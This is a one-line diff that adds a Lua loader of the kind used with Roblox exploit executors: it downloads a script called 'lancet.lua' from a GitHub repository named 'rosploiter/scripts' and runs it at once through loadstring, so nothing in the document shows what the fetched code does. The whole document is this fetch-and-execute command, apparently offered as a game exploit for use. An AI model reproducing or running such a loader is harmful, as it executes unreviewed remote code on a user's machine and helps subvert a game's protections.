@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rosploiter/scripts/refs/heads/main/lancet.lua",true))()
